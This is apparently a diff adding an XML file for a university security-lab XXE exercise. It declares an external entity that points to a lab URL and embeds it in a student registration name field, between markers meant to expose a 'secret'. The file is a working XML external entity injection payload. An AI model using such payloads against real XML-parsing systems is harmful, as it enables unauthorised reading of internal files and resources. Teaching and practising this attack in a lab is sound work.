@@ -1,0 +1,28 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE registration [
+	<!ENTITY  interest SYSTEM "http://cadolzburger.xxe.netsec.seclab-bonn.de/group-11/">
+]>
+<registration>
+  <student>
+    <name>
+      <first>start of the secretII&interest;IIend of the secret </first>
+      <last>Idiot</last>
+    </name>
+    <email>idiot@hacking.de</email>
+  </student>
+  <student>
+    <name>
+      <first>Hacking;</first>
+      <last>Idiot2</last>
+    </name>
+    <email>idiot@hacking2.de</email>
+  </student>
+  <student>
+    <name>
+      <first>Hacking</first>
+      <last>Idiot3</last>
+    </name>
+    <email>idiot@hacking3.de</email>
+  </student>
+</registration>
+
